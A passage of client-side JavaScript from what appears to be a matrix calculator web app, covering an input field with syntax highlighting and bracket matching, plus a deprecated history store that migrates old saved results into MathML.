    while (step === 0 && selectionStart < Math.min(inputSelectionStart + 1, value.length)) {
      c = value.charCodeAt(selectionStart);
      var brackets = "()[]{}ã€–ã€—ï¼ˆï¼‰";
      for (var k = 0; k < brackets.length; k += 2) {
        if (c === brackets.charCodeAt(k)) {
          pair = brackets.charCodeAt(k + 1);
          step = +1;
        }
        if (c === brackets.charCodeAt(k + 1)) {
          pair = brackets.charCodeAt(k);
          step = -1;
        }
      }
      selectionStart += 1;
    }
    selectionStart -= 1;
    if (step !== 0) {
      var i = selectionStart;
      var depth = 1;
      i += step;
      while (i >= 0 && i < value.length && depth > 0) {
        var code = value.charCodeAt(i);
        if (code === c) {
          depth += 1;
        }
        if (code === pair) {
          depth -= 1;
        }
        i += step;
      }
      i -= step;
      if (depth === 0) {
        return {
          first: {start: selectionStart, end: selectionStart + 1, className: "bracket-mark"},
          second: {start: i, end: i + 1, className: "bracket-mark"}
        };
      } else {
        return {
          first: {start: selectionStart, end: selectionStart + 1, className: "odd-bracket-mark"},
          second: undefined
        };
      }
    }
    return {
      first: undefined,
      second: undefined
    };
  };

  // TODO: to polyfills (?)
  var getClientLeft = function (input) {
    // ! Element#clientLeft and Element#clientTop are rounded to integer
    return input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderLeftWidth) : input.clientLeft;
  };
  var getClientTop = function (input) {
    // ! Element#clientLeft and Element#clientTop are rounded to integer
    return input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderTopWidth) : input.clientTop;
  };

  var updateMargins = function () {
    var clientLeft = getClientLeft(input);
    var clientTop = getClientTop(input);
    //var inputRect = input.getBoundingClientRect();
    var clientRight = input.offsetWidth - input.clientWidth - clientLeft;
    var clientBottom = input.offsetHeight - input.clientHeight - clientTop;

    backgroundElement.style.marginLeft = (clientLeft + marginLeft).toString() + "px";
    backgroundElement.style.marginTop = (clientTop + marginTop).toString() + "px";
    backgroundElement.style.marginRight = (clientRight + marginRight).toString() + "px";
    backgroundElement.style.marginBottom = (clientBottom + marginBottom).toString() + "px";
  };

  var updateDirectionality = function () {
    var dir = input.getAttribute('dir') || 'ltr';
    if (backgroundElement.getAttribute('dir') !== dir) { // avoid layout invalidation in Chrome
      backgroundElement.setAttribute('dir', dir);
    }
  };

  // TODO: start, end, insertion
  var updateLine = function (line, marks, lineNode) {
    //lineNode.textContent = '';
    var tokenNode = lineNode.firstElementChild;
    var tokenizer = new Tokenizer(line, 0, null);
    var token = null;
    var position = 0;
    while ((token = tokenizer.next()).type !== 'EOF') {
      var className = null;
      for (var i = 0; i < marks.length; i += 1) {
        var m = marks[i];
        if (m.start >= position && m.end <= tokenizer.position) {
          className = m.className;
        }
      }
      if (tokenNode == null) {
        tokenNode = document.createElement('span');
        tokenNode.textContent = ' ';
        lineNode.appendChild(tokenNode);
      }
      //TODO: move ?
      var type = token.type === 'symbol' && /^pi|[eiEIUnkXY]$/.test(token.value) ? 'special-symbol' : token.type;
      var tokenText = line.slice(position, tokenizer.position); // token.value contains replaced characters and even the token.value can have a different length
      updateTokenNode(tokenNode, tokenText, type, className);
      position = tokenizer.position;
      tokenNode = tokenNode.nextElementSibling;
    }
    while (tokenNode != null) {
      var next = tokenNode.nextElementSibling;
      tokenNode.parentNode.removeChild(tokenNode);
      tokenNode = next;
    }
    //TODO: EOF?

/*
    var start = 0;
    var end = line.length;

    for (var i = 0; i < marks.length; i += 1) {
      var m = marks[i];
      var s = m.start > start ? m.start : start;
      var e = m.end < end ? m.end : end;
      if (s < e) {
        add(line.slice(start, s), null, null, lineNode);
        add(line.slice(s, e), null, m.className, lineNode);
        start = e;
      }
    }
    if (start < end) {
      add(line.slice(start, end), null, null, lineNode);
      start = end;
    }
*/
    if (input.getAttribute("list") != undefined && textAlign !== 'center') {
      add("  ", null, null, lineNode); // to increase scrollWidth in Chrome
    }
  };

  var map = {};
  var idCounter = -1;

  var getCursorPosition = function (input) {
    try {
      return input.selectionDirection !== 'forward' ? input.selectionStart : input.selectionEnd;
    } catch (error) {
      // input.type === 'number' on some browsers
      // Firefox 3.6.28 throws when trying to get selectionStart/selectionEnd on invisible element (textarea/input)
      // Not sure if it is fast to check visibility using "input.getBoundingClientRect().left === 0".
      console.error(error);
      return null;
    }
  };

  var getCursorSecondPosition = function (input) {
    try {
      return input.selectionDirection === 'forward' ? input.selectionStart : input.selectionEnd;
    } catch (error) {
      // input.type === 'number' on some browsers
      console.error(error);
      return null;
    }
  };

  var update = function (event) {
    var value = input.value;
    var marks = [];
    var tmp0 = getBracketMarks(value, getCursorPosition(input));
    if (tmp0.first != undefined) {
      marks.push(tmp0.first);
    }
    if (tmp0.second != undefined) {
      marks.push(tmp0.second);
    }
    var error = input.getAttribute("data-error");
    if (error != undefined) {
      marks.push({start: Number(error.split(",")[0]), end: Number(error.split(",")[1]), className: "error-mark"});
    }
    marks.sort(function (a, b) {
      return a.start < b.start ? -1 : (b.start < a.start ? +1 : 0);
    });

      //var scrollLeft = input.scrollLeft;
      //var scrollTop = input.scrollTop;
      updateMargins();
      updateDirectionality();

      var lines = value.split('\n');
      var start = 0;
      var node = backgroundElement.firstElementChild;
      for (var j = 0; j < lines.length; j += 1) {
        if (node == null) {
          node = document.createElement("div");
          node.id = idPrefix + (++idCounter);
          map[node.id] = {line: null, lineMarks: null};
          backgroundElement.appendChild(node);
        }
        var div = node;
        var line = lines[j];
        var lineMarks = [];
        for (var i = 0; i < marks.length; i += 1) {
          var m = marks[i];
          var s = Math.max(m.start - start, 0);
          var e = Math.min(m.end - start, line.length + '\n'.length);
          if (s < e) {
            lineMarks.push({start: s, end: e, className: m.className});
          }
        }
        var data = map[div.id];
        if (line !== data.line || JSON.stringify(lineMarks) !== JSON.stringify(data.lineMarks)) {
          //Note: empty lines are collapsed
          //Note: extra whitespace/newline may work not well with text-align inequal to 'start'
          updateLine(line || ' ', lineMarks, div);
          data.line = line;
          data.lineMarks = lineMarks;
        }
        start += line.length + '\n'.length;
        node = node.nextElementSibling;
      }
      while (node != undefined) {
        var next = node.nextElementSibling;
        delete map[node.id];
        node.parentNode.removeChild(node);
        node = next;
      }

      //window.requestAnimationFrame(function () {//?
        // avoid strange style recalcuation which stops the smooth scrolling animation (element.scrollIntoViewIfNeeded(false))
        //if (backgroundElement.scrollLeft !== scrollLeft) {
        //  backgroundElement.scrollLeft = scrollLeft;
        //}
        //if (backgroundElement.scrollTop !== scrollTop) {
        //  backgroundElement.scrollTop = scrollTop;
        //}
      //});
  };

  var updateMarks = function () {
    update(undefined);
  };
  
  var wasSelected = false;
  // if selection contains exactly one token and it is not a punctuation or operator select all other similar tokens
  var updateSelectionMatches = function (start, end) {
    if (start > end) {
      var tmp = start;
      start = end;
      end = tmp;
    }
    if (end - start >= 1 || wasSelected) {
      var selectedToken = null;
      var lineNode = backgroundElement.firstElementChild;
      var lineStart = 0;
      while (lineNode != null) {
        var data = map[lineNode.id];
        var line = data.line;
        var s = Math.min(start - lineStart, line.length);
        var e = Math.min(end - lineStart, line.length);
        if (s < e) {
          var tokenNode = lineNode.firstElementChild;
          while (tokenNode != null) {
            var n = tokenNode.firstChild.data.length;
            if (s === 0 && e === n) {
              selectedToken = tokenNode;
            }
            s -= n;
            e -= n;
            tokenNode = tokenNode.nextElementSibling;
          }
        }
        lineStart += line.length + '\n'.length;
        lineNode = lineNode.nextElementSibling;
      }
      if (wasSelected || selectedToken != null) {
        var selectionText = selectedToken != null && (selectedToken.classList.contains('symbol') || selectedToken.classList.contains('special-symbol')) ? selectedToken.firstChild.data : null;
        var lineNode = backgroundElement.firstElementChild;
        while (lineNode != null) {
          var tokenNode = lineNode.firstElementChild;
          while (tokenNode != null) {
            var ok = tokenNode.firstChild.data === selectionText;
            tokenNode.classList.toggle("selectionMatches", ok);
            wasSelected = wasSelected || ok;
            tokenNode = tokenNode.nextElementSibling;
          }
          lineNode = lineNode.nextElementSibling;
        }
      }
    }
  };

  var oldCursorPosition = null;
  var oldCursorSecondPosition = null;
  var ticking = false;
  var checkSelectionChange = function (event) {
    if (!ticking) {
      ticking = true;
      window.requestAnimationFrame(function () { // selectionStart is not changed yet for mousedown event
        ticking = false;
        var newCursorPosition = getCursorPosition(input);
        var newCursorSecondPosition = getCursorSecondPosition(input);
        var flag = oldCursorPosition !== newCursorPosition;
        if (flag) {
          oldCursorPosition = newCursorPosition;
          updateMarks();
        }
        if (flag || oldCursorSecondPosition !== newCursorSecondPosition) {
          oldCursorSecondPosition = newCursorSecondPosition;
          updateSelectionMatches(newCursorPosition, newCursorSecondPosition);
        }
      });
    }
  };
  // https://github.com/w3c/selection-api/issues/53
  // selectionchange
  input.addEventListener("a-input.selectionchange", checkSelectionChange, false);

  var listenForSelectionChangeOrScroll = function (f) {
    // wheel : Shift + mousewheel
    // dragover : https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
    var events = ['keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove', 'touchmove', 'input', 'focus', 'blur', 'wheel', 'dragover'];
    for (var i = 0; i < events.length; i += 1) {
      input.addEventListener(events[i], f, events[i] === 'wheel' || events[i] === 'touchmove' ? {passive: true} : false);
    }
  };

  if (!isSelectionChangeEventSupported(input)) {
    listenForSelectionChangeOrScroll(checkSelectionChange);
  }

  input.addEventListener("input", update, false);
  input.addEventListener("update-attribute", function (event) {
    updateMarks();
  }, false);
  var scrollUpdateTicking = false;
  var onScroll = function (event) {
    if (!scrollUpdateTicking) {
      scrollUpdateTicking = true;
      window.requestAnimationFrame(function () {
        scrollUpdateTicking = false;
        var scrollLeft = input.scrollLeft;
        var scrollTop = input.scrollTop;
        backgroundElement.scrollLeft = scrollLeft;
        backgroundElement.scrollTop = scrollTop;
      });
    }
  };
  input.addEventListener("scroll", onScroll, false);

  isScrollEventSupported(input, function (supported) {
    if (!supported) {
      // as the "scroll" event is not supported on Chrome
      listenForSelectionChangeOrScroll(onScroll);
      input.addEventListener("a-input.selectionchange", onScroll, false);
    }
  });

  container.classList.toggle('enabled', document.hasFocus() && container.querySelector('input[type="number"]') == null);//!
  container.classList.toggle('focus-within', document.activeElement === input);
  container.setAttribute('lang', '');
  var supports = true;
  try {
    //TODO: use CSS.supports('selector(:focus-within)') instead
    document.body.matches(':focus-within');
  } catch (error) {
    supports = false;
  }
  if (!supports) {
    input.addEventListener("focus", function (event) {
      container.classList.toggle('focus-within', true);
    }, false);
    input.addEventListener("blur", function (event) {
      container.classList.toggle('focus-within', false);
    }, false);
  }

  update(undefined);
};

window.initializeAInput = initializeAInput;

  // document.hasFocus is not a function in Opera Mini
//TODO: this is too slow as style is recalculated on all elements:

  if (typeof document.hasFocus !== 'function') {//TODO: ?
    document.hasFocus = function () {
      return true;
    };
  }

  var onFocusOrBlur = function (event) {
    var hasFocus = document.hasFocus();
    //document.documentElement.classList.toggle('focus-within', hasFocus);
    var es = document.getElementsByClassName('a-input');
    for (var i = 0; i < es.length; i += 1) {
      es[i].classList.toggle('enabled', hasFocus && es[i].querySelector('input[type="number"]') == null);
    }
  };

  //document.documentElement.classList.toggle('focus-within', document.hasFocus != null ? document.hasFocus() : true);
  window.addEventListener("focus", onFocusOrBlur, false);
  window.addEventListener("blur", onFocusOrBlur, false);

  var lastSelection = {
    anchorNode: null,
    focusNode: null
  };
  var fire = function (node) {
    if (node != null) {
      if (node.nodeType === Node.TEXT_NODE) {
        node = node.parentNode;
      }
      if (node != null) {
        node.dispatchEvent(new Event('a-input.selectionchange'));
      }
    }
  };
  var f = function (a, b) {
    if (a !== b) {
      fire(a);
      fire(b);
    } else {
      fire(a);
    }
  };
  var getContainer = function (container, offset) {
    if (container == null) {
      return null;
    }
    var c = container.firstChild;
    var i = 0;
    while (c != null && i < offset) {
      i += 1;
      c = c.nextSibling;
    }
    if (c != null && c.nodeType === Node.ELEMENT_NODE && (c.tagName.toLowerCase() === 'input' || c.tagName.toLowerCase() === 'textarea')) {
      return c;
    }
    return container;
  };
  document.addEventListener('selectionchange', function (event) {
    var selection = window.getSelection();
    var anchorNode = getContainer(selection.anchorNode, selection.anchorOffset);
    var focusNode = getContainer(selection.focusNode, selection.focusOffset);
    if (lastSelection.anchorNode === lastSelection.focusNode && anchorNode === focusNode) {
      f(lastSelection.anchorNode, anchorNode);
    } else {
      f(lastSelection.anchorNode, anchorNode);
      f(lastSelection.focusNode, focusNode);
    }
    lastSelection.anchorNode = anchorNode;
    lastSelection.focusNode = focusNode;
  }, false);

}());

/*global window, document, unescape, hit, Node */

// deprecated

(function () {
"use strict";

function ItemsStorage(keyStorage, itemUpdater) {
  this.keyStorage = keyStorage;
  this.itemUpdater = itemUpdater;
}
ItemsStorage.prototype._save = function (items) {
  var data = [];
  for (var i = 0; i < items.length; i += 1) {
    var x = items[i];
    if (x != undefined) {
      data.push(x);
    }
  }
  var keyStorage = this.keyStorage;
  var save = function (limit) {
    if (data.length > limit) {
      var newData = new Array(limit);
      for (var j = 0; j < limit; j += 1) {
        newData[j] = data[data.length - limit + j];
      }
      data = newData;
    }
    var valueToSave = JSON.stringify(data);
    keyStorage.setItem("resdiv", valueToSave);
    var value = keyStorage.getItem("resdiv");
    if (value !== valueToSave && limit > 1 && valueToSave.length > 1024 * 1024) {
      return save(Math.floor(limit / 2));
    }
    return undefined;
  };
  return save(data.length);
};
ItemsStorage.prototype._load = function () {
  var parseJSONArraySafely = function (value) {
    try {
      // old data ?
      var result = JSON.parse(value);
      if (!(result instanceof Array)) {
        throw new RangeError();
      }
      return result;
    } catch (error) {
      window.setTimeout(function () {
        throw error;
      }, 0);
    }
    return [];
  };
  var value = this.keyStorage.getItem("resdiv");
  var items = value != undefined ? parseJSONArraySafely(value) : [];

  try {
    var m = /(?:^|;)\s*lastResult\s*\=\s*([^;]*)/.exec(document.cookie);
    if (m != undefined) {
      var lastResult = unescape(m[1]);
      if (lastResult !== "") {
        window.setTimeout(function () {
          hit({bc: "cookie"});
        }, 0);
        items.unshift([lastResult]);
        var valueToSave = JSON.stringify(items);
        this.keyStorage.setItem("resdiv", valueToSave);
        if (this.keyStorage.getItem("resdiv") === valueToSave) {
          document.cookie = "lastResult=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
        }
      }
    }
  } catch (error) {
    window.setTimeout(function () {
      throw error;
    }, 0);
  }

  var currentNumber = 0;
  for (var i = 0; i < items.length; i += 1) {
    items[i] = this.itemUpdater(items[i], currentNumber + 1);
    currentNumber = Math.max(currentNumber, items[i].actHistoryId);
  }
  return {
    items: items,
    currentNumber: currentNumber
  };
};
ItemsStorage.prototype.getAllEntries = function (callback) {
  var tmp = this._load();
  var items = tmp.items;
  var keys = new Array(items.length);
  for (var i = 0; i < items.length; i += 1) {
    keys[i] = items[i].actHistoryId;
  }
  callback({keys: keys, items: items});
};
ItemsStorage.prototype.add = function (item, callback) {
  var tmp = this._load();
  var items = tmp.items;
  var currentNumber = tmp.currentNumber;
  var key = currentNumber + 1;
  item.actHistoryId = key;
  items.push(item);
  this._save(items);
  callback(key);
};
ItemsStorage.prototype["delete"] = function (key) {
  var tmp = this._load();
  var items = tmp.items;
  for (var i = 0; i < items.length; i += 1) {
    var x = items[i];
    if (x != undefined && x.actHistoryId === key) {
      items[i] = undefined;
    }
  }
  this._save(items);
};
ItemsStorage.prototype.clear = function () {
  this._save([]);
};


ItemsStorage.updateItem = function (data, idIfNotSet) {
  idIfNotSet = idIfNotSet || undefined;

  var oldVersion = data.version || 0;
  if (oldVersion === 0) {
    // emptry strings are needed for `zInsAct`
    var resultHTML = data.length > 0 ? data[0] : "";
    var resultMatrix = data.length > 1 ? data[1] : "";
    data = {
      resultHTML: resultHTML.indexOf("</custom-math>") === -1 && resultHTML.indexOf("</math>") === -1 ? "<div class=\"math\">" + resultHTML + "</div>" : resultHTML,
      resultMatrix: resultMatrix,
      details: data.length > 2 ? data[2] : undefined,
      expressionString: data.length > 3 ? data[3] : undefined,
      actHistoryId: data.length > 4 ? Number(data[4]) : idIfNotSet,
      detailsHTML: data.length > 5 ? data[5] : undefined,
      version: 7
    };
  }

  if (oldVersion <= 7) {
    if (data.resultMatrix != undefined && data.resultMatrix.indexOf(";") !== -1) {
      // "-17/3\t 4\t 4/3;  8/3\t-2\t-1/3;   -2\t 1\t   1"
      data.resultMatrix = "{{" + data.resultMatrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
      hit({bc: "resultMatrix"});//!
    }
  }

  if (data.resultMatrix === '') {
    var tmp = /onclick\="\(new Matrix\('str',\d+,(\d+)(?:,\d+)?,([\-0-9\/',]+)\)\).print\('a'\);">/.exec(data.resultHTML);
    if (tmp != null) {
      var colsNumber = Number(tmp[1]);
      var rows = [];
      var x = tmp[2].replace(/'/g, '').split(',');
      while (x.length !== 0) {
        rows.push('{' + x.slice(0, colsNumber).join(',') + '}');
        x = x.slice(colsNumber);
      }
      data.resultMatrix = '{' + rows.join(',') + '}';
    }
  }

  if (true) {
    var removeInsertButtons = function (e) {
      var spans = e.querySelectorAll('span');
      for (var i = 0; i < spans.length; i += 1) {
        if (spans[i].style != null && spans[i].style.cssFloat === 'right') {
          spans[i].parentNode.removeChild(spans[i]);
        }
      }
    };
    var removeCustomMath = function (e) {
      var elements = e.querySelectorAll('custom-math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        var math = document.createElement('math');
        math.innerHTML = x.innerHTML;
        x.parentNode.insertBefore(math, x);
        x.parentNode.removeChild(x);
      }
    };
    var removeMathClass = function (e) {
      var elements = e.querySelectorAll('.math');
      for (var i = 0; i < elements.length; i += 1) {
        var x = elements[i];
        if (x.firstChild === x.lastChild && x.firstElementChild != null && x.firstElementChild.tagName.toLowerCase() === 'math') {
          x.parentNode.insertBefore(x.firstChild, x);
          x.parentNode.removeChild(x);
        } else {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      var es = e.querySelectorAll('span');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        while (x != null && x.tagName.toLowerCase() !== 'math') {
          x = x.parentNode;
        }
        if (x != null) {
          while (x.firstChild != null) {
            x.parentNode.insertBefore(x.firstChild, x);
          }
          x.parentNode.removeChild(x);
        }
      }

      // add <math></math>
      var visit = function (x) {
        if (x.nodeType === Node.ELEMENT_NODE && x.tagName.toLowerCase().slice(0, 1) === 'm') {
          if (x.tagName.toLowerCase() !== 'math') {
            if (x.previousSibling != null && x.previousSibling.nodeType === Node.ELEMENT_NODE && x.previousElementSibling.tagName.toLowerCase() === 'math') {
              x.previousElementSibling.appendChild(x);
            } else {
              var math = document.createElement('math');
              x.parentNode.insertBefore(math, x);
              x.parentNode.removeChild(x);
              math.appendChild(x);
            }
          }
        } else {
          var c = x.firstChild;
          while (c != null) {
            var next = c.nextSibling;
            visit(c);
            c = next;
          }
        }
      };
      visit(e);
    };
    var removeExtraMrows = function (e) {
      var es = e.querySelectorAll('mrow');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.firstChild === x.lastChild && x.firstChild != null && x.attributes.length === 0) {
          x.parentNode.insertBefore(x.firstChild, x);
          x.parentNode.removeChild(x);
        }
      }
    };
    var addRowspacing = function (e) {
      var es = e.querySelectorAll('mtable');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.getAttribute('rowspacing') == null) {
          x.setAttribute('rowspacing', '0ex');
        }
      }
    };
    var addMROWs = function (e) {
      var c = e.firstElementChild;
      while (c != undefined) {
        var next = c.nextElementSibling;
        if (c.tagName.toLowerCase() !== 'mrow') {
          hit({bc: "msub+msup"});//!
          var mrow = document.createElement("mrow");
          c.parentNode.insertBefore(mrow, c);
          c.parentNode.removeChild(c);
          mrow.appendChild(c);
        }
        c = next;
      }
    };
    var fixSummary = function (e) {
      var elements = e.querySelectorAll(".summary");
      for (var i = 0; i < elements.length; i += 1) {
        var oldSummary = elements[i];
        if (oldSummary != undefined && oldSummary.tagName.toLowerCase() !== "summary") { // backward compatibility
          hit({bc: ".summary"});//!
          var newSummary = document.createElement("summary");
          while (oldSummary.firstChild != undefined) {
            newSummary.appendChild(oldSummary.firstChild);
          }
          oldSummary.parentNode.insertBefore(newSummary, oldSummary);
          oldSummary.parentNode.removeChild(oldSummary);
        }
      }
    };
    var fixMSUBAndMSUP = function (node) {
      // MFENCED - ?
      if (" mfrac msqrt mroot msub msup munder ".indexOf(" " + node.tagName.toLowerCase() + " ") !== -1) {
        addMROWs(node);
      }
      var c = node.firstElementChild;
      while (c != undefined) {
        fixMSUBAndMSUP(c);
        c = c.nextElementSibling;
      }
    };
    var fixDetails = function (e) {
      var elements = e.querySelectorAll(".details");
      for (var i = 0; i < elements.length; i += 1) {
        var oldDetails = elements[i];
        hit({bc: ".details"});//!
        var container = document.createElement("div");
        container.classList.toggle("details-container", true);
        oldDetails.parentNode.insertBefore(container, oldDetails);
        oldDetails.parentNode.removeChild(oldDetails);
        oldDetails.classList.toggle("details", false);
        container.appendChild(oldDetails);
      }
    };
    var fixDetailsContainer = function (e) {
      var elements = e.querySelectorAll(".details-container");
      for (var i = 0; i < elements.length; i += 1) {
        var old = elements[i];
        var c = old.firstElementChild;
        if (c.classList.contains("details-container")) {
          hit({bc: ".details-container"});//!
          c.parentNode.removeChild(c);
          old.parentNode.insertBefore(c, old);
          old.parentNode.removeChild(old);
        }
      }
    };
    var fixOldDetailsTypes = function (e) {
      var elements = e.querySelectorAll("[data-details]");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var detailsAttribute = element.getAttribute("data-details");
        var x = JSON.parse(detailsAttribute);
        if (x instanceof Array) {
          hit({bc: 'detailsarray'});
          if (x.length !== 1) {
            throw new TypeError(x.length);//!
          }
          x = x[0];
        }
        var type = x.type;
        if (type === "determinant" || type === "inverse" || type === "rank") {
          hit({bc: "details-" + type});//!
          x.type = type + "-Gauss";
        }
        element.setAttribute("data-details", JSON.stringify(x));
        var idPrefix = element.getAttribute("data-id-prefix") || '';
        if (!/\-/.test(idPrefix)) {
          element.setAttribute("data-id-prefix", idPrefix + '-d' + i);
        }
      }
    };
    var fixMatrixContainer = function (e) { // <= 7
      var elements = e.querySelectorAll(".matrix-container");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var matrix = element.querySelector(".matrix-menu-show");
        element.removeAttribute('class');//!
        if (matrix != undefined) { // old version
          hit({bc: "matrix-container"});//!
          matrix = matrix.getAttribute("data-matrix") || element.getAttribute("data-matrix");
          if (matrix != undefined) { // Uncaught TypeError: Cannot read property 'replace' of null - https://matrixcalc.org/es/
            if (matrix.indexOf(";") !== -1 || matrix.indexOf("\t") !== -1) {
              matrix = "{{" + matrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
            }
            var columnlines = undefined;
            var useBraces = undefined;
            if (element.firstElementChild.tagName.toLowerCase() === 'mfenced') {
              columnlines = element.firstElementChild.firstElementChild.getAttribute("columnlines");
              if (columnlines != undefined) {
                columnlines = -1;//TODO:
              }
            }
            if (element.querySelector("[open=\"|\"]") != undefined) {
              useBraces = ["|", "|"];
            }
            if (element.querySelector("[open=\"{\"]") != undefined) {
              useBraces = ["{", " "];
            }
            var tmp = document.createElement("div");
            tmp.innerHTML = RPNProxy.toMathML(matrix, {
              columnlines: columnlines,
              useBraces: useBraces
            });
            element.parentNode.insertBefore(tmp.firstElementChild, element);
            element.parentNode.removeChild(element);
          }
        }
      }
    };
    var fixTop = function (e) { // <= 7
      // <span class="top">-1</span>
      var elements = e.querySelectorAll(".top");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.innerHTML === "-1" || element.innerHTML === "T") {
          hit({bc: "top"});//!
          var base = element.previousElementSibling;
          var tmp = document.createElement("div");
          tmp.innerHTML = "<msup><mrow></mrow><mrow>" + RPNProxy.toMathML(element.innerHTML, {}) + "</mrow></msup>";
          base.parentNode.removeChild(base);
          tmp.firstElementChild.firstElementChild.appendChild(base);
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixDivMath = function (e) { // <= 7
      var x = e.firstElementChild;
      if (x != undefined && x.tagName.toLowerCase() === 'div' && x.classList.contains('math')) {
        //x.style.display = "inline-block";
        x.setAttribute("style", "display: inline-block;");
      }
    };
    var fixTable = function (e) {
      // <table class="inTable"></table>
      var elements = e.querySelectorAll(".inTable");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        var span = element.nextElementSibling;
        var matrix = '';
        if (span != undefined && span.tagName.toLowerCase() === 'span' && span.style.display === 'none') {
          matrix = "{{" + span.innerHTML.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
          span.parentNode.removeChild(span);
        } else {
          var matrix = '';
          matrix += '{';
          var tbody = element.firstElementChild;
          for (var row = tbody.firstElementChild; row != null; row = row.nextElementSibling) {
            matrix += '{';
            for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
              if (cell.getAttribute('rowspan') == null) {
                var t = cell.querySelector('table');
                if (t != null) {
                  var x = t.firstElementChild.firstElementChild.textContent + '/' + t.firstElementChild.lastElementChild.textContent;
                  t.innerHTML = x;
                }
                matrix += cell.textContent;//TODO:
                matrix += cell.nextElementSibling != null && cell.nextElementSibling.getAttribute('rowspan') == null ? ',' : '';
              }
            }
            matrix += '}';
            matrix += row.nextElementSibling != null ? ',' : '';
          }
          matrix += '}';
        }
        if (matrix !== '') {
          hit({bc: "inTable"});//!
          var tmp = document.createElement("div");
          var isDeterminant = element.querySelector(".matrix-img-line") != undefined;
          tmp.innerHTML = RPNProxy.toMathML(isDeterminant ? "determinant(" + matrix + ")" : matrix, {});
          element.parentNode.insertBefore(tmp.firstElementChild, element);
          element.parentNode.removeChild(element);
        }
      }
    };
    var fixArrowWithLabel = function (e) {
      var elements = e.querySelectorAll(".arrow-with-label");
      for (var i = 0; i < elements.length; i += 1) {
        var element = elements[i];
        if (element.getAttribute("data-custom-paint") !== "arrow-with-label") {
          element.setAttribute("data-custom-paint", "arrow-with-label");
          hit({bc: "arrow-with-label"});
        }
      }
    };
    var fixMencloseInMenclose = function (e) {
      if (e.querySelector('math') == null) {//!
        var elements = e.querySelectorAll("menclose[notation=none]");
        for (var i = 0; i < elements.length; i += 1) {
          var element = elements[i];
          var mtable = element.querySelector("mtable");
          if (mtable != null && mtable.firstElementChild != null && mtable.firstElementChild === mtable.lastElementChild && mtable.firstElementChild.firstElementChild === mtable.firstElementChild.lastElementChild) {
            var e = mtable.querySelector("menclose[notation=none]");
            if (e != null && e.querySelector("mtable") != undefined && element.getAttribute('data-matrix') === '{{' + e.getAttribute('data-matrix') + '}}') {
              hit({bc: "menclose-menclose"});
              element.parentNode.insertBefore(e, element);
              element.parentNode.removeChild(element);
            }
          }
        }
      }
    };
    var replaceMfenced = function (e) {
      var es = e.querySelectorAll('mfenced');
      for (var i = 0; i < es.length; i += 1) {
        var e = es[i];
        var open = e.getAttribute('open') || '(';
        var mo1 = document.createElement('mo');
        mo1.textContent = open;
        var close = e.getAttribute('close') || ')';
        var mo2 = document.createElement('mo');
        mo2.textContent = close;
        var t = document.createElement('mrow');
        t.appendChild(mo1);
        while (e.firstChild != null) {
          t.appendChild(e.firstChild);
        }
        t.appendChild(mo2);
        e.parentNode.insertBefore(t, e);
        e.parentNode.removeChild(e);
      }
    };
    var fixClassPivot = function (e) {
      var es = e.querySelectorAll('.pivot');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i];
        if (x.tagName.toLowerCase() === 'mtd') {
          x.removeAttribute('class');
          var tmp = document.createElement('menclose');
          tmp.setAttribute('notation', 'circle');
          while (x.firstChild != null) {
            tmp.appendChild(x.firstChild);
          }
          x.appendChild(tmp);
        }
      }
    };
    var fixMoMo = function (html) {
      //TODO: counter
      return html.replace(/<mo>\+<mo>/g, "<mo>+</mo>");
    };
    var fixDiagonalizeSteps = function (html) {
      return html.replace(/diagonalize-steps/g, "steps-to-diagonalize");
    };
    var removeHref = function (tmp) {
      var es = tmp.querySelectorAll('[href="#"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('href');
      }
    };
    var removeMatrixMenuShowNew = function (tmp) {
      var es = tmp.querySelectorAll('.matrix-menu-show-new');
      for (var i = 0; i < es.length; i += 1) {
        es[i].classList.toggle('matrix-menu-show', true);
        es[i].classList.toggle('matrix-menu-show-new', false);
        if (es[i].textContent === 'â˜°') {
          es[i].textContent = '';
        }
      }
    };
    var removeDataX = function (tmp) {
      var es = tmp.querySelectorAll('[data-x="TODO"]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].removeAttribute('data-x');
      }
    };
    var fixMunder = function (tmp) {
      var es = tmp.querySelectorAll('munder');
      for (var i = 0; i < es.length; i += 1) {
        es[i].setAttribute('accentunder', 'true');
      }
    };
    var fixRemoveSpanWrappers = function (tmp) {
      var es = tmp.querySelectorAll('math');
      for (var i = 0; i < es.length; i += 1) {
        var parentNode = es[i].parentNode;
        if (parentNode.tagName.toLowerCase() === 'span') {
          if (parentNode.getAttributeNames().join('') === 'class' && parentNode.childElementCount === 1) {
            var classList = parentNode.getAttribute('class');
            if (classList.replace(/(?:^|\s)no\-\S+|math/g, '').trim() === '') {
              parentNode.parentNode.insertBefore(es[i], parentNode);
              parentNode.parentNode.removeChild(parentNode);
            }
          }
        }
      }
    };
    var fixQuestionIcon = function (tmp) {
      var es = tmp.querySelectorAll('.relative');
      for (var i = 0; i < es.length; i += 1) {
        var x = es[i].firstElementChild;
        if (x != null && x.tagName.toLowerCase() === 'math') {
          var y = x.nextElementSibling;
